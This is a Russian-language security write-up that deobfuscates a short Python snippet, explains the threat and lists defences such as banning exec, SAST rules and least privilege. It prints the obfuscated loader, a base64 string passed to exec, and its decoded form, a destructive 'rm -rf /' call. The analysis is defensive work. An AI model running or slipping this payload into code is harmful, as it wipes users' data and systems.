# Деобфускация скрипта

## Исходный обфусцированный фрагмент

```python
a = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk="
import base64
b = base64.b64decode(a).decode('utf-8')
exec(b)
```

## Декодирование

Строка была декодирована безопасно — только `base64.b64decode(...)`,
без вызова `exec`:

```python
>>> import base64
>>> base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=").decode()
"import os; os.system('rm -rf /')"
```

**Расшифрованная строка:**

```python
import os; os.system('rm -rf /')
```

## Описание угрозы

- `exec(b)` выполняет декодированную строку как Python-код.
- `os.system('rm -rf /')` передаёт в командную оболочку команду
  `rm -rf /` — рекурсивное (`-r`) принудительное (`-f`, без подтверждений)
  удаление всего, начиная с корня файловой системы `/`.
- Последствия: уничтожение пользовательских данных, исходного кода,
  конфигураций и системных файлов в пределах прав процесса. При запуске
  от `root` (например, в Docker-контейнере или CI-раннере) — полный вывод
  системы из строя, потеря данных и простой сервиса. Современный GNU `rm`
  требует `--no-preserve-root` для `/`, но это не защищает от вариантов вроде
  `rm -rf /*` или `rm -rf ~`.
- Обфускация через Base64 скрывает команду от беглого code-review и от
  простого поиска по ключевым словам (`rm`, `os.system`).

Класс угрозы: внедрение и выполнение произвольного кода (CWE-94, Code
Injection) / вредоносная логика (logic bomb), классификация по OWASP —
A03:2021 Injection.

## Методы защиты

1. **Запрет `exec`/`eval` в кодовой базе** — правило статического анализа
   (Bandit `B102 exec_used`, `B307 eval`; Ruff/flake8-bandit `S102`, `S307`)
   с блокировкой PR в CI.
2. **Статический анализ и SAST в CI/CD** — Bandit, Semgrep, SonarQube:
   поиск `os.system`, `subprocess(..., shell=True)`, `base64.b64decode` →
   `exec`.
3. **Обязательный code-review** с CODEOWNERS и защитой веток: подозрительные
   закодированные строки должны требовать объяснения.
4. **Валидация входных данных** — никогда не исполнять данные, пришедшие
   извне (файлы, сеть, переменные окружения).
5. **Принцип наименьших привилегий** — запуск сервисов не от `root`,
   read-only файловая система контейнера, sandbox/seccomp.
6. **Резервное копирование и мониторинг** — регулярные бэкапы, контроль
   целостности файлов, аудит выполняемых процессов.
7. **Проверка зависимостей** — `pip-audit`, фиксация версий и хэшей,
   чтобы вредоносный код не пришёл через стороннюю библиотеку.
